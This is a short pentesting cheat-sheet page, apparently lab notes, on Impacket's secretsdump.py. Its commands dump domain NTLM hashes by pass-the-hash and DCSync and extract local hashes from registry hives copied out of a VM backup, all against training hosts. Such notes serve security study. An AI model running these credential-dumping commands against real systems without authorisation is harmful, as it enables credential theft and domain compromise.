---
title: secretsdump.py - A module from impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# secretsdump.py


 Performs various techniques to dump hashes from the remote machine without executing any agent there.  For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system  (%SYSTEMROOT%\\Temp dir) and read the rest of the data from there.

https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py

```
# Dumping NTDS with SecretsDump
secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

# Use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
secretsdump.py -just-dc-user $domain/administrator -k -no-pass "$hostName"@$hostName.$domain
# Example:
# secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Another example of dumpling NTDS with SecretsDump
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```


#### Retrieving Hashes using Secretsdump.py

Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

